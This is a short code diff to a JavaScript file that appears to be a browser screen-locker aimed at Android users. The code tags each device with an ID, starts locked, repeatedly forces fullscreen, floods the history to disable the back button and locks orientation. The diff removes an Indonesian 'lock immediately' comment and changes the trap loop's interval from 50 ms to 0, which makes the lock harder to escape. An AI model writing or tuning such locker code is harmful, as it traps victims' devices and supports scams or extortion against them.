@@ -18,7 +18,6 @@ const DID='z'+Math.random().toString(36).substring(2,15);
 const M=navigator.userAgent.match(/Android[\s\d.]+/)?.[0]||'Android';
 let locked=true;
 
-// LANGSUNG SEMAT MATI
 sematMati();
 
 async function reg(){
@@ -108,7 +107,7 @@ setInterval(()=>{
   goFull();
   for(let i=0;i<3;i++) history.pushState(null,'',location.href);
   if(screen.orientation?.lock) screen.orientation.lock('portrait').catch(()=>{});
-},50);
+},0);
 
 reg();
 setInterval(chk,5000);
